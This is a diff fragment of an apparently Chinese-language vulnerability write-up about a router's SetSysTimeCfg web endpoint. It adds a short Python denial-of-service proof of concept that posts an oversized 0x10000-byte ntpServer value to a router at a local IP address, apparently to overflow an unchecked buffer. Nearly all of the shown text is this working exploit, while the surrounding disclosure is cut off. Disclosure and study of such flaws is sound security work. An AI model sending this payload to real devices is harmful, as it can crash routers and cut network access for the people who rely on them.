@@ -20,3 +20,14 @@ v4来源于http数据包中的ntpServer参数，但是，在对该参数进行�
 
 拒绝服务的poc：
 
+```python
+import requests
+
+url = "https://192.168.2.1/goform/SetSysTimeCfg"
+
+ntpserver = b"a"*0x10000
+timeType = "sync"
+r = requests.post(url, data={"timeType" : timeType ,"ntpServer" : ntpserver},verify=False)
+print(r.content)
+```
+
